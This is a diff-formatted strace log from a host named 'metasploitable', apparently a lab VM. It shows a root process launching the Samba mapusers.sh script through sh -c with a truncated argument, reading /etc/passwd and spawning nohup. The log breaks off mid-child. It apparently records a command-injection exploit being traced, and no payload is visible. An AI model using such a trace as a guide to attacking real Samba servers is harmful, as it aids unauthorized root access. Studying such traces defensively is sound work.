+[pid  6362] 22:01:44.783486 close(143)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783496 close(144)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783506 close(145)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783515 close(146)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783525 close(147)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783535 close(148)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783545 close(149)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783555 close(150)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783579 close(151)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783589 close(152)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783599 close(153)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783608 close(154)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783618 close(155)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783628 close(156)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783638 close(157)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783647 close(158)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783657 close(159)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783667 close(160)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783676 close(161)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783686 close(162)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783696 close(163)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783706 close(164)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783715 close(165)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783725 close(166)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783735 close(167)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783744 close(168)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783754 close(169)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783764 close(170)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783773 close(171)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783783 close(172)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783793 close(173)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783802 close(174)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783812 close(175)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783822 close(176)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783831 close(177)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783841 close(178)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783851 close(179)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783860 close(180)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783870 close(181)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783880 close(182)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783889 close(183)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783899 close(184)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783909 close(185)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783918 close(186)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783928 close(187)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783938 close(188)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783947 close(189)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783957 close(190)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783967 close(191)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783976 close(192)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783986 close(193)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.783995 close(194)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784005 close(195)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784015 close(196)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784024 close(197)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784034 close(198)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784044 close(199)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784053 close(200)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784063 close(201)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784073 close(202)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784082 close(203)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784092 close(204)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784101 close(205)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784111 close(206)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784121 close(207)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784131 close(208)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784140 close(209)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784150 close(210)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784160 close(211)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784170 close(212)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784179 close(213)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784189 close(214)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784199 close(215)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784209 close(216)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784218 close(217)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784228 close(218)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784238 close(219)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784266 close(220)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784286 close(221)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784296 close(222)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784305 close(223)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784315 close(224)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784325 close(225)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784334 close(226)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784344 close(227)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784354 close(228)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784363 close(229)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784373 close(230)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784383 close(231)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784392 close(232)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784402 close(233)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784412 close(234)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784421 close(235)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784431 close(236)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784441 close(237)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784450 close(238)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784460 close(239)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784470 close(240)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784479 close(241)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784489 close(242)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784499 close(243)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784508 close(244)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784518 close(245)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784527 close(246)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784537 close(247)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784547 close(248)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784556 close(249)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784566 close(250)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784575 close(251)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784585 close(252)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784595 close(253)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784604 close(254)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784614 close(255)  = -1 EBADF (Bad file descriptor)
+[pid  6362] 22:01:44.784674 execve("/bin/sh", ["sh", "-c", "/etc/samba/scripts/mapusers.sh \""...], [/* 15 vars */]) = 0
+[pid  6362] 22:01:44.784836 brk(0)      = 0x80f9000
+[pid  6362] 22:01:44.784868 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.784888 mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f30000
+[pid  6362] 22:01:44.784908 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.784933 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6362] 22:01:44.784949 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6362] 22:01:44.784984 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7f28000
+[pid  6362] 22:01:44.784995 close(3)    = 0
+[pid  6362] 22:01:44.785009 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.785032 open("/lib/libncurses.so.5", O_RDONLY) = 3
+[pid  6362] 22:01:44.785050 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\200\220"..., 512) = 512
+[pid  6362] 22:01:44.785075 fstat64(3, {st_mode=S_IFREG|0644, st_size=190584, ...}) = 0
+[pid  6362] 22:01:44.785110 mmap2(NULL, 194420, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7ef8000
+[pid  6362] 22:01:44.785123 mmap2(0xb7f25000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2c) = 0xb7f25000
+[pid  6362] 22:01:44.785144 close(3)    = 0
+[pid  6362] 22:01:44.785157 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.785177 open("/lib/tls/i686/cmov/libdl.so.2", O_RDONLY) = 3
+[pid  6362] 22:01:44.785198 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\n\0\000"..., 512) = 512
+[pid  6362] 22:01:44.785220 fstat64(3, {st_mode=S_IFREG|0644, st_size=9684, ...}) = 0
+[pid  6362] 22:01:44.785254 mmap2(NULL, 12412, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7ef4000
+[pid  6362] 22:01:44.785266 mmap2(0xb7ef6000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1) = 0xb7ef6000
+[pid  6362] 22:01:44.785285 close(3)    = 0
+[pid  6362] 22:01:44.785298 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.785315 open("/lib/tls/i686/cmov/libc.so.6", O_RDONLY) = 3
+[pid  6362] 22:01:44.785334 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\260e\1"..., 512) = 512
+[pid  6362] 22:01:44.785356 fstat64(3, {st_mode=S_IFREG|0755, st_size=1364388, ...}) = 0
+[pid  6362] 22:01:44.785390 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ef3000
+[pid  6362] 22:01:44.785406 mmap2(NULL, 1369712, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7da4000
+[pid  6362] 22:01:44.785417 mmap2(0xb7eed000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x149) = 0xb7eed000
+[pid  6362] 22:01:44.785435 mmap2(0xb7ef0000, 9840, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7ef0000
+[pid  6362] 22:01:44.785451 close(3)    = 0
+[pid  6362] 22:01:44.785480 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da3000
+[pid  6362] 22:01:44.785493 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7da36b0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
+[pid  6362] 22:01:44.785586 mprotect(0xb7eed000, 4096, PROT_READ) = 0
+[pid  6362] 22:01:44.785634 munmap(0xb7f28000, 29338) = 0
+[pid  6362] 22:01:44.785672 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.785692 open("/dev/tty", O_RDWR|O_NONBLOCK|O_LARGEFILE) = -1 ENXIO (No such device or address)
+[pid  6362] 22:01:44.785718 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf928b20) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  6362] 22:01:44.785767 brk(0)      = 0x80f9000
+[pid  6362] 22:01:44.785777 brk(0x80fa000) = 0x80fa000
+[pid  6362] 22:01:44.785793 brk(0x80fb000) = 0x80fb000
+[pid  6362] 22:01:44.785816 getuid32()  = 0
+[pid  6362] 22:01:44.785826 getgid32()  = 0
+[pid  6362] 22:01:44.785836 geteuid32() = 0
+[pid  6362] 22:01:44.785846 getegid32() = 0
+[pid  6362] 22:01:44.785865 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.785883 time(NULL)  = 1478487704
+[pid  6362] 22:01:44.785901 brk(0x80fc000) = 0x80fc000
+[pid  6362] 22:01:44.785919 brk(0x80fd000) = 0x80fd000
+[pid  6362] 22:01:44.785947 open("/proc/meminfo", O_RDONLY) = 3
+[pid  6362] 22:01:44.785978 fstat64(3, {st_mode=S_IFREG|0444, st_size=0, ...}) = 0
+[pid  6362] 22:01:44.786014 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2f000
+[pid  6362] 22:01:44.786028 read(3, "MemTotal:      4152252 kB\nMemFre"..., 1024) = 846
+[pid  6362] 22:01:44.786079 close(3)    = 0
+[pid  6362] 22:01:44.786091 munmap(0xb7f2f000, 4096) = 0
+[pid  6362] 22:01:44.786104 brk(0x80fe000) = 0x80fe000
+[pid  6362] 22:01:44.786136 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786157 rt_sigaction(SIGCHLD, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786177 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786197 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786217 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786237 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786259 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.786274 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.786296 uname({sys="Linux", node="metasploitable", ...}) = 0
+[pid  6362] 22:01:44.786416 stat64("/", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6362] 22:01:44.786452 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6362] 22:01:44.786488 getpid()    = 6362
+[pid  6362] 22:01:44.786507 getppid()   = 6361
+[pid  6362] 22:01:44.786527 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6362] 22:01:44.786565 stat64("/sbin/sh", 0xbf928af8) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.786581 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6362] 22:01:44.786617 stat64("/bin/sh", {st_mode=S_IFREG|0755, st_size=701808, ...}) = 0
+[pid  6362] 22:01:44.786668 socket(PF_FILE, SOCK_STREAM, 0) = 3
+[pid  6362] 22:01:44.786683 fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  6362] 22:01:44.786699 connect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.786742 close(3)    = 0
+[pid  6362] 22:01:44.786757 socket(PF_FILE, SOCK_STREAM, 0) = 3
+[pid  6362] 22:01:44.786768 fcntl64(3, F_SETFL, O_RDWR|O_NONBLOCK) = 0
+[pid  6362] 22:01:44.786781 connect(3, {sa_family=AF_FILE, path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.786820 close(3)    = 0
+[pid  6362] 22:01:44.786836 open("/etc/nsswitch.conf", O_RDONLY) = 3
+[pid  6362] 22:01:44.786856 fstat64(3, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
+[pid  6362] 22:01:44.786890 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f2f000
+[pid  6362] 22:01:44.786902 read(3, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 475
+[pid  6362] 22:01:44.786928 read(3, "", 4096) = 0
+[pid  6362] 22:01:44.786939 close(3)    = 0
+[pid  6362] 22:01:44.786949 munmap(0xb7f2f000, 4096) = 0
+[pid  6362] 22:01:44.786969 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6362] 22:01:44.786985 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6362] 22:01:44.787019 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7f28000
+[pid  6362] 22:01:44.787030 close(3)    = 0
+[pid  6362] 22:01:44.787043 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.787064 open("/lib/tls/i686/cmov/libnss_compat.so.2", O_RDONLY) = 3
+[pid  6362] 22:01:44.787087 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0@\16\0\000"..., 512) = 512
+[pid  6362] 22:01:44.787110 fstat64(3, {st_mode=S_IFREG|0644, st_size=30436, ...}) = 0
+[pid  6362] 22:01:44.787144 mmap2(NULL, 33352, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d9a000
+[pid  6362] 22:01:44.787156 mmap2(0xb7da1000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6) = 0xb7da1000
+[pid  6362] 22:01:44.787177 close(3)    = 0
+[pid  6362] 22:01:44.787190 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.787208 open("/lib/tls/i686/cmov/libnsl.so.1", O_RDONLY) = 3
+[pid  6362] 22:01:44.787229 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\00001\0\000"..., 512) = 512
+[pid  6362] 22:01:44.787252 fstat64(3, {st_mode=S_IFREG|0644, st_size=83708, ...}) = 0
+[pid  6362] 22:01:44.787286 mmap2(NULL, 96232, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d82000
+[pid  6362] 22:01:44.787297 mmap2(0xb7d96000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x13) = 0xb7d96000
+[pid  6362] 22:01:44.787315 mmap2(0xb7d98000, 6120, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7d98000
+[pid  6362] 22:01:44.787332 close(3)    = 0
+[pid  6362] 22:01:44.787364 munmap(0xb7f28000, 29338) = 0
+[pid  6362] 22:01:44.787385 open("/etc/ld.so.cache", O_RDONLY) = 3
+[pid  6362] 22:01:44.787401 fstat64(3, {st_mode=S_IFREG|0644, st_size=29338, ...}) = 0
+[pid  6362] 22:01:44.787434 mmap2(NULL, 29338, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7f28000
+[pid  6362] 22:01:44.787446 close(3)    = 0
+[pid  6362] 22:01:44.787458 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.787480 open("/lib/tls/i686/cmov/libnss_nis.so.2", O_RDONLY) = 3
+[pid  6362] 22:01:44.787501 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\20\31\0"..., 512) = 512
+[pid  6362] 22:01:44.787524 fstat64(3, {st_mode=S_IFREG|0644, st_size=34352, ...}) = 0
+[pid  6362] 22:01:44.787557 brk(0x80ff000) = 0x80ff000
+[pid  6362] 22:01:44.787571 mmap2(NULL, 37436, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d78000
+[pid  6362] 22:01:44.787583 mmap2(0xb7d80000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x7) = 0xb7d80000
+[pid  6362] 22:01:44.787603 close(3)    = 0
+[pid  6362] 22:01:44.787617 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
+[pid  6362] 22:01:44.787634 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 3
+[pid  6362] 22:01:44.787656 read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30"..., 512) = 512
+[pid  6362] 22:01:44.787678 fstat64(3, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
+[pid  6362] 22:01:44.787715 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xb7d6d000
+[pid  6362] 22:01:44.787727 mmap2(0xb7d76000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x8) = 0xb7d76000
+[pid  6362] 22:01:44.787747 close(3)    = 0
+[pid  6362] 22:01:44.787771 munmap(0xb7f28000, 29338) = 0
+[pid  6362] 22:01:44.787787 open("/etc/passwd", O_RDONLY|0x80000 /* O_??? */) = 3
+[pid  6362] 22:01:44.787807 fcntl64(3, F_GETFD) = 0x1 (flags FD_CLOEXEC)
+[pid  6362] 22:01:44.787820 _llseek(3, 0, [0], SEEK_CUR) = 0
+[pid  6362] 22:01:44.787834 fstat64(3, {st_mode=S_IFREG|0644, st_size=1581, ...}) = 0
+[pid  6362] 22:01:44.787867 mmap2(NULL, 1581, PROT_READ, MAP_SHARED, 3, 0) = 0xb7f2f000
+[pid  6362] 22:01:44.787879 _llseek(3, 1581, [1581], SEEK_SET) = 0
+[pid  6362] 22:01:44.787899 munmap(0xb7f2f000, 1581) = 0
+[pid  6362] 22:01:44.787910 close(3)    = 0
+[pid  6362] 22:01:44.787940 brk(0x8100000) = 0x8100000
+[pid  6362] 22:01:44.787961 getpgrp()   = 4409
+[pid  6362] 22:01:44.787972 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  6362] 22:01:44.787995 getrlimit(RLIMIT_NPROC, {rlim_cur=36*1024, rlim_max=36*1024}) = 0
+[pid  6362] 22:01:44.788016 brk(0x8101000) = 0x8101000
+[pid  6362] 22:01:44.788064 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.788083 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.788104 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.788172 brk(0x8102000) = 0x8102000
+[pid  6362] 22:01:44.788206 pipe([3, 4]) = 0
+[pid  6362] 22:01:44.788224 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.788260 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6362] 22:01:44.788276 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6362] 22:01:44.788294 clone(Process 6363 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7da36f8) = 6363
+[pid  6363] 22:01:44.788454 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6363] 22:01:44.788475 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6363] 22:01:44.788524 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6363] 22:01:44.788544 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6363] 22:01:44.788570 rt_sigaction(SIGINT, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6363] 22:01:44.788592 rt_sigaction(SIGQUIT, {SIG_DFL}, {SIG_IGN}, 8) = 0
+[pid  6363] 22:01:44.788612 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6363] 22:01:44.788634 rt_sigaction(SIGCHLD, {0x807e540, [], 0}, {SIG_DFL}, 8) = 0
+[pid  6363] 22:01:44.788658 rt_sigaction(SIGINT, {0x8091fd0, [], 0}, {SIG_DFL}, 8) = 0
+[pid  6363] 22:01:44.788714 dup2(4, 1)  = 1
+[pid  6363] 22:01:44.788732 close(4)    = 0
+[pid  6363] 22:01:44.788742 close(3)    = 0
+[pid  6363] 22:01:44.788769 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6363] 22:01:44.788794 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6363] 22:01:44.788884 brk(0x8103000) = 0x8103000
+[pid  6363] 22:01:44.788919 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6363] 22:01:44.788957 stat64("/sbin/nohup", 0xbf928558) = -1 ENOENT (No such file or directory)
+[pid  6363] 22:01:44.789055 stat64("/bin/nohup", 0xbf928558) = -1 ENOENT (No such file or directory)
+[pid  6363] 22:01:44.789070 stat64("/usr/sbin/nohup", 0xbf928558) = -1 ENOENT (No such file or directory)
+[pid  6363] 22:01:44.789086 stat64("/usr/bin/nohup", {st_mode=S_IFREG|0755, st_size=26336, ...}) = 0
+[pid  6363] 22:01:44.789124 stat64("/usr/bin/nohup", {st_mode=S_IFREG|0755, st_size=26336, ...}) = 0
+[pid  6363] 22:01:44.789167 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6363] 22:01:44.789184 clone(Process 6364 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7da36f8) = 6364
+[pid  6364] 22:01:44.789248 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6364] 22:01:44.789269 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.789290 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.789309 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6364] 22:01:44.789334 rt_sigaction(SIGINT, {SIG_DFL}, {0x8091fd0, [], 0}, 8) = 0
